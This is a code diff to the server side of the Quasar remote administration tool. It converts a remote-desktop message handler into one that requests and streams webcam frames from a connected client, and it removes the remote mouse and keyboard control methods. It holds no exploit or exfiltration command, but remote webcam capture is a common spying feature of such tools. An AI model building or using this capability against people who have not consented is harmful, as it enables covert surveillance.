@@ -12,7 +12,7 @@ namespace Quasar.Server.Messages
     /// <summary>
     /// Handles messages for the interaction with the remote desktop.
     /// </summary>
-    public class RemoteDesktopHandler : MessageProcessorBase<Bitmap>, IDisposable
+    public class RemoteWebcamHandler : MessageProcessorBase<Bitmap>, IDisposable
     {
         /// <summary>
         /// States if the client is currently streaming desktop frames.
@@ -98,16 +98,16 @@ namespace Quasar.Server.Messages
         private UnsafeStreamCodec _codec;
 
         /// <summary>
-        /// Initializes a new instance of the <see cref="RemoteDesktopHandler"/> class using the given client.
+        /// Initializes a new instance of the <see cref="RemoteWebcamHandler"/> class using the given client.
         /// </summary>
         /// <param name="client">The associated client.</param>
-        public RemoteDesktopHandler(Client client) : base(true)
+        public RemoteWebcamHandler(Client client) : base(true)
         {
             _client = client;
         }
 
         /// <inheritdoc />
-        public override bool CanExecute(IMessage message) => message is GetDesktopResponse || message is GetMonitorsResponse;
+        public override bool CanExecute(IMessage message) => message is GetWebcamResponse || message is GetAvailableWebcamsResponse;
 
         /// <inheritdoc />
         public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);
@@ -117,10 +117,10 @@ namespace Quasar.Server.Messages
         {
             switch (message)
             {
-                case GetDesktopResponse d:
-                    Execute(sender, d);
+                case GetWebcamResponse frame:
+                    Execute(sender, frame);
                     break;
-                case GetMonitorsResponse m:
+                case GetAvailableWebcamsResponse m:
                     Execute(sender, m);
                     break;
             }
@@ -138,7 +138,8 @@ namespace Quasar.Server.Messages
                 IsStarted = true;
                 _codec?.Dispose();
                 _codec = null;
-                _client.Send(new GetDesktop { CreateNew = true, Quality = quality, DisplayIndex = display, Status = RemoteDesktopStatus.Start });
+                _client.Send(new GetWebcam { CreateNew = true, Quality = quality, DisplayIndex = display, Status = RemoteWebcamStatus.Start });
+                Console.WriteLine("Sent message!");
             }
         }
 
@@ -154,7 +155,7 @@ namespace Quasar.Server.Messages
 
             Console.WriteLine("we done here");
 
-            _client.Send(new GetDesktop { Status = RemoteDesktopStatus.Stop });
+            _client.Send(new GetWebcam { Status = RemoteWebcamStatus.Stop });
         }
 
         /// <summary>
@@ -163,44 +164,10 @@ namespace Quasar.Server.Messages
         public void RefreshDisplays()
         {
             Console.WriteLine("refreshing displays");
-            _client.Send(new GetMonitors());
+            _client.Send(new GetAvailableWebcams());
         }
 
-        /// <summary>
-        /// Sends a mouse event to the specified display of the client.
-        /// </summary>
-        /// <param name="mouseAction">The mouse action to send.</param>
-        /// <param name="isMouseDown">Indicates whether it's a mousedown or mouseup event.</param>
-        /// <param name="x">The X-coordinate inside the <see cref="LocalResolution"/>.</param>
-        /// <param name="y">The Y-coordinate inside the <see cref="LocalResolution"/>.</param>
-        /// <param name="displayIndex">The display to execute the mouse event on.</param>
-        public void SendMouseEvent(MouseAction mouseAction, bool isMouseDown, int x, int y, int displayIndex)
-        {
-            lock (_syncLock)
-            {
-                _client.Send(new DoMouseEvent
-                {
-                    Action = mouseAction,
-                    IsMouseDown = isMouseDown,
-                    // calculate remote width & height
-                    X = x * _codec.Resolution.Width / LocalResolution.Width,
-                    Y = y * _codec.Resolution.Height / LocalResolution.Height,
-                    MonitorIndex = displayIndex
-                });
-            }
-        }
-
-        /// <summary>
-        /// Sends a keyboard event to the client.
-        /// </summary>
-        /// <param name="keyCode">The pressed key.</param>
-        /// <param name="keyDown">Indicates whether it's a keydown or keyup event.</param>
-        public void SendKeyboardEvent(byte keyCode, bool keyDown)
-        {
-            _client.Send(new DoKeyboardEvent { Key = keyCode, KeyDown = keyDown });
-        }
-
-        private void Execute(ISender client, GetDesktopResponse message)
+        private void Execute(ISender client, GetWebcamResponse message)
         {
             lock (_syncLock)
             {
@@ -230,9 +197,10 @@ namespace Quasar.Server.Messages
             }
         }
 
-        private void Execute(ISender client, GetMonitorsResponse message)
+        private void Execute(ISender client, GetAvailableWebcamsResponse message)
         {
-            OnDisplaysChanged(message.Number);
+            int displays = message.Webcams.Length;
+            OnDisplaysChanged(displays);
         }
 
         /// <summary>
